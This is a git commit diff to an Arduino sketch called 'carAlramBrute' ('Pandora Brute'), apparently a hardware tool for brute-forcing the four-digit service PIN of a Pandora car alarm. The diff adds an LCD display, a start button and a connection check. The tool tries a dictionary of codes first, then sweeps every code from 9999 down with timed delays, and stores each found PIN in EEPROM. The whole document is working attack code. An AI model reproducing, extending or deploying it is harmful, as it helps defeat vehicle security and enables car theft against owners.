7f9d6ea81566dec7502b9fa910c84d1d58c8ec8c
Михаил Лямаев <misha25_live@mail.ru>
2018-02-10 03:12:27 +1000

    add lcd, cheking connecting and saving last found password

--- carAlramBrute/carAlramBrute.ino
+++ carAlramBrute/carAlramBrute.ino
@@ -3,13 +3,23 @@
  Created:	28.01.2018 19:01:59
  Author:	misha
 */
+#include <LiquidCrystal.h>
 #include <EEPROM.h>
 #include "dictionary.h"
+const int BUT_START = 6;
 const int BUTTON = 3;
 const int RED = 4;
 const int GREEN = 5;
-
+const short ptrLastPsw = 1015;
+const short ptrMaxEepromDict = 1012;
+LiquidCrystal lcd(11, 12, 10, 9, 8, 7);
+//				  RS  E   D4  D5 D6 D7
 bool enterPas(short a);
+short lastConstDict = 0;
+short dictLength = 0;
+short lastEepromDict = 0;
+short pasW = 0;
+
 void eeprom_write_short(short adrr,short value);
 short eeprom_read_short(short adrr);
 int compare(const void * x1, const void * x2)   // функция сравнения элементов массива
@@ -22,31 +32,73 @@ void setup() {
 	pinMode(BUTTON, OUTPUT);
 	pinMode(RED, INPUT);
 	pinMode(GREEN, INPUT);
+	pinMode(BUT_START, INPUT);
 	digitalWrite(BUTTON, 0);
-	//eeprom_write_short(0,9743);
-	//eeprom_write_short(2,4579);
-	//eeprom_write_short(4,-1);
-	short lastConstDict = 0;
-	short dictLength = 0;
-	short lastEepromDict = 0;
-	short pasW = 0;
-	for (lastConstDict = 0; dict[lastConstDict] != -1; lastConstDict++);
+	lcd.begin(16, 2);
+//	eeprom_write_short(0, -1);
+}
+
+// the loop function runs over and over again until power down or reset
+void loop() {
+	lcd.clear();
+	lcd.print("Pandora Brute");
+	lcd.setCursor(0, 1);
+	lcd.print("Last passw: ");
+	lcd.print(eeprom_read_short(ptrLastPsw));
+	Serial.print("Last passw: ");
+	Serial.println(eeprom_read_short(ptrLastPsw));
+	while (!digitalRead(BUT_START));
+	delay(500);
+	while (digitalRead(BUT_START));
+	lcd.clear();
+	lcd.print("Cheking...");
+	digitalWrite(BUTTON, 1);
+	delay(200);
+	long tempMil = millis();
+	while (!(digitalRead(GREEN) || digitalRead(RED))) {
+		if (millis() - tempMil > 1000) {
+			digitalWrite(BUTTON, 0);
+			lcd.clear();
+			lcd.print("Error....");
+			lcd.setCursor(0, 1);
+			lcd.print("Wait 7sec");
+			delay(7500);
+			return;
+		}
+	};
+	digitalWrite(BUTTON, 0);
+	lcd.clear();
+	lcd.print("All OK Wait 7sec");
+	delay(7500);
+	for (lastConstDict = 0; dict[lastConstDict] != -1; lastConstDict++);//find last in dict
 	short dataRead = eeprom_read_short(0);
-	for (lastEepromDict = 2; dataRead != -1; lastEepromDict += 2)
+	Serial.println("Saved pasw");
+	for (lastEepromDict = 2; dataRead != -1; lastEepromDict += 2)//add eeprom to end of dict
 	{
 		dict[lastConstDict] = dataRead;
 		Serial.println(dataRead);
 		lastConstDict++;
 		dataRead = eeprom_read_short(lastEepromDict);
 	}
-	lastEepromDict-=2;
+	lastEepromDict -= 2;
 	dict[lastConstDict] = -1;
+
+
 	Serial.println("Begin BruteForce with dictionary");
-	for (short i = 0; dict[i] != -1; i++) {
+	lcd.clear();
+	lcd.print("Working... dict");
+	for (short i = 0; dict[i] != -1; i++) {//BruteForce with dictionary
+		lcd.setCursor(0, 1);
 		if (enterPas(dict[i])) {
-			pasW = dict[i];
 			Serial.println("password found! In dictionary It's");
-			Serial.println(((int)pasW));
+			Serial.println(((int)dict[i]));
+			eeprom_write_short(ptrLastPsw, dict[i]);//writeLast Password
+			lcd.clear();
+			lcd.print("Found in dict!!!");
+			lcd.setCursor(0, 1);
+			lcd.print("Passw: ");
+			lcd.print(dict[i]);
+			while (digitalRead(BUT_START));
 			return;
 		}
 		dictLength++;
@@ -54,45 +106,44 @@ void setup() {
 	}
 
 	qsort(dict, dictLength, sizeof(short), compare);
-	Serial.println("qsort");
-	for (short i = 0; dict[i] != -1; i++) {
-		Serial.println(((int)dict[i]));
-	}
 	Serial.println("Begin BruteForce all pins");
 	dictLength = 0;
-	short j = 0; 
-	for (short i = 2224; i >= 0; i--) {
-			if (dict[j] == i) {
-				Serial.print("Skip.............");
-				Serial.println(((int)j));
-				j++;
-				continue;
-			}
-			if (enterPas(i)) {
-				Serial.print("lastEepromDict");
-				Serial.println(((int)lastEepromDict));
-				if (lastEepromDict < 1010) {
-					Serial.println("Writing....");
-					eeprom_write_short(lastEepromDict, i);
-					eeprom_write_short(lastEepromDict+2, -1);
-				}
-				pasW = i;
-				break;
-			}
-				delay(5100);
+	short j = 0;
+	lcd.clear();
+	lcd.print("Working... others");
+	for (short i = 9999; i >= 0; i--) {
+		if (dict[j] == i) {
+			Serial.print("Skip.............");
+			Serial.println(((int)j));
+			j++;
+			continue;
 		}
-	Serial.println("password found! It's");
-	Serial.println(((int)pasW));
-	
-}
-
-// the loop function runs over and over again until power down or reset
-void loop() {
-		
-	digitalWrite(13, 1);
-	delay(500);
-	digitalWrite(13, 0);
-	delay(500);
+		lcd.setCursor(0, 1);
+		if (enterPas(i)) {
+			Serial.print("lastEepromDict");
+			Serial.println(((int)lastEepromDict));
+			if (lastEepromDict < ptrMaxEepromDict) {
+				Serial.println("Writing....");
+				eeprom_write_short(lastEepromDict, i);
+				eeprom_write_short(lastEepromDict + 2, -1);
+			}
+			lcd.clear();
+			lcd.print("Found!!!");
+			lcd.setCursor(0, 1);
+			lcd.print("Passw: ");
+			lcd.print(i);
+			eeprom_write_short(ptrLastPsw, i);//writeLast Password
+			Serial.println("password found! It's");
+			Serial.println(((int)i));
+			while (digitalRead(BUT_START));
+			return;
+		}
+		delay(5100);
+	}
+	lcd.clear();
+	lcd.print("Pasw didn't find");
+	Serial.println("password didn't find");
+	while (digitalRead(BUT_START));
 	
 }
 bool enterPas(short a) {
@@ -104,9 +155,10 @@ bool enterPas(short a) {
 		i--;
 	}
 
-	for (i = 0; i < 4; i++)
+	for (i = 0; i < 4; i++) {
 		Serial.print(((int)m[i]));
-
+		lcd.print(((int)m[i]));
+	}
 	for (i=0; i < 4; i++) {
 		if (m[i] == 0)
 			m[i] = 10;
